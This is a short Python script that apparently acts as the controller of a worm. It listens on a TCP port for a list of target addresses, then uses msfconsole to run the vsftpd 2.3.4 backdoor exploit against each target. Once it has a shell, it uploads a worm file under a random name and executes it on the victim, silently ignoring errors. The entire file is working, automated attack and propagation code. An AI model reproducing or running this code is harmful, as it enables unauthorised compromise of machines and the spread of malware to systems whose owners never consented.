#!python3
from nclib import TCPServer
import pexpect
import sys
from random import random
import string as strings
from time import sleep

def listener():

	server = TCPServer(("192.168.56.108", 1337))
	for client in server:
		target_list = client.recv()

		target_list = str(target_list.rstrip())

		target_list = target_list[3:-2]

		target_list = target_list.split(',')

		print(target_list)
		return target_list

def generate(target):

	try:
	
		process = pexpect.spawn(["msfconsole"])
		process.logfile = sys.stdout.buffer
		process.expect("msf6")

		process.sendline("use exploit/unix/ftp/vsftpd_234_backdoor")
		process.sendline("set rhost "+target)
		process.sendline("run")
		process.expect("Command shell session 1 opened")

		noise = str(random())
		randname = noise + ".py"


		process.sendline("upload /home/peyton/Documents/Worm/wyrm.py "+randname)
		process.expect("finished")

		process.sendline("shell")
		process.expect("Found bash")
		process.sendline("shell")
		sleep(5)
		process.sendline("cd / && chmod +x "+randname+" && python "+randname)
		sleep(10)
		process.sendline("exit")

	except:
		pass
	
while True:
	
	target_list = listener()
	for target in target_list:
		generate(target)
